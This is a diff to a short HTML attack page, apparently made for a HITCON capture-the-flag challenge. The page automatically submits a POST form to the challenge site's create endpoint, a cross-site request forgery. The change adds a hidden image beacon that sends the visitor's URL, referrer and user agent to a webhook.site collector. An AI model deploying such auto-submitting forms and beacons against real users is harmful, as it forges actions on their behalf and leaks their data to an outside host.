@@ -1,6 +1,6 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>sp-create</title></head>
+<head><meta charset="utf-8"><title>sp-create-r200</title></head>
 <body>
 <p id="s">starting</p>
 <form id="f" method="POST" action="https://sitepreview.chal.hitconctf.com/create">
@@ -8,8 +8,13 @@
 <button type="submit">go</button>
 </form>
 <script>
-document.getElementById('s').textContent = 'submitting at '+Date.now();
-document.getElementById('f').submit();
+(function(){
+  var W='https://webhook.site/e899cb66-610b-4a44-a1a1-33da7de4dd11/';
+  var t=Date.now();
+  new Image().src=W+'?js=1&t='+t+'&o='+encodeURIComponent(location.href)+'&r='+encodeURIComponent(document.referrer||'')+'&ua='+encodeURIComponent((navigator.userAgent||'').slice(0,80));
+  document.getElementById('s').textContent='submitting at '+t;
+  setTimeout(function(){ document.getElementById('f').submit(); }, 300);
+})();
 </script>
 </body>
 </html>
